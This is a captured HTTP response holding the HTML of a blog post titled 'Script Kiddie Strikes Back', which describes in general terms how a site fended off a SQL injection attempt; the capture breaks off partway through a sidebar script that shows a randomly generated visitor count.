+Content-Type: text/html; charset=UTF-8
+Content-Length: 8633
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | Script Kiddie Strikes Back: But Not for Long!&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;
+                    Script Kiddie Strikes Back: But Not for Long!                &lt;/h1&gt;
+                &lt;p class=&quot;lead mb-3&quot;&gt;
+                    Another chapter in the ongoing saga of thwarting cyber nuisances, complete with an upgrade in our digital armor.                &lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;text-center mt-4&quot;&gt;
+                &lt;a href=&quot;index.php&quot; class=&quot;btn btn-primary btn-lg&quot;&gt;Back to Home&lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;img style=&quot;max-height: 600px;&quot; src=&quot;static/images/script_kiddie-v2.jpg&quot; class=&quot;img-fluid mb-4&quot;&gt;
+    &lt;p&gt;
+        Just when we thought the digital waters were calm, another script kiddie tried their luck. Armed with nothing but misguided confidence and a freshly downloaded hacking toolkit, they aimed at the gates of our digital kingdom. But fear not, for their efforts were thwarted by our latest and greatest defenses.
+    &lt;/p&gt;
+    &lt;h2&gt;The Attack&lt;/h2&gt;
+    &lt;p&gt;
+        Picture it: a peaceful evening disrupted by alerts and logs flashing with the tell-tale signs of an amateur intrusion. This time, our would-be hacker, let's call them &quot;ByteBandit404,&quot; attempted a more sophisticated attack vector than our previous visitor.
+    &lt;/p&gt;
+    &lt;p&gt;
+        ByteBandit404 thought they had found the Achilles' heel of our system with a SQL injection attempt. Little did they know, we've layered our security with the top SQL injection prevention techniques available on the cyber market.
+    &lt;/p&gt;
+    &lt;h2&gt;The Defense&lt;/h2&gt;
+    &lt;p&gt;
+        In response to the frequent attempts by these digital miscreants, I've implemented a fortress of cybersecurity measures. Here’s a breakdown:
+        &lt;ul&gt;
+            &lt;li&gt;&lt;strong&gt;Enhanced Input Sanitization:&lt;/strong&gt; Every piece of data entering our servers is now cleaned, scrubbed, and sanitized. Think of it as a digital car wash, but for code.&lt;/li&gt;
+            &lt;li&gt;&lt;strong&gt;Real-time Threat Detection:&lt;/strong&gt; With AI-driven surveillance, we spot and stop threats before they even fully form their malicious plans.&lt;/li&gt;
+            &lt;li&gt;&lt;strong&gt;Automated Responses:&lt;/strong&gt; When ByteBandit404 tried their attack, our system didn't just block them; it learned from the attempt, adapting to ensure that particular trick never works again.&lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/p&gt;
+    &lt;h2&gt;Illustrating Our Defense&lt;/h2&gt;
+    &lt;p&gt;
+        To give you a clearer picture, let's visualize our defenses:
+    &lt;/p&gt;
+    &lt;img style=&quot;max-height: 600px;&quot; src=&quot;static/images/ScriptKiddie-v2.webp&quot; alt=&quot;Cybersecurity Shield Diagram&quot; class=&quot;img-fluid mb-4&quot;&gt;
+    &lt;p&gt;
+        This diagram shows the multi-layered approach we use to guard against attacks. 
+    &lt;/p&gt;
+    &lt;p&gt;
+        Here’s another image capturing the moment our defenses caught ByteBandit404 in the act:
+    &lt;/p&gt;
+    &lt;img style=&quot;max-height: 600px;&quot; src=&quot;static/images/ScriptKiddie-v2-2.webp&quot; alt=&quot;Baffled Hacker Illustration&quot; class=&quot;img-fluid mb-4&quot;&gt;
+    &lt;p&gt;
+        Notice the confusion and utter disbelief on their digital face as our systems lock them out.
+    &lt;/p&gt;
+    &lt;h2&gt;A Secure Future&lt;/h2&gt;
+    &lt;p&gt;
+        As Encoder64, my commitment to maintaining the integrity and security of our digital domains has never been stronger. Let this be a message to all potential intruders: Our defenses evolve faster than your attack methods. Your efforts are futile here.
+    &lt;/p&gt;
+&lt;/div&gt;            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Help wanted!&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Help us improving the articles of the blog&lt;/h6&gt;
+            &lt;p&gt;Submit yours &lt;a href=&quot;posts/upload-article.php&quot;&gt;here!&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3;</pre></div>
+</div>
+</body></html>
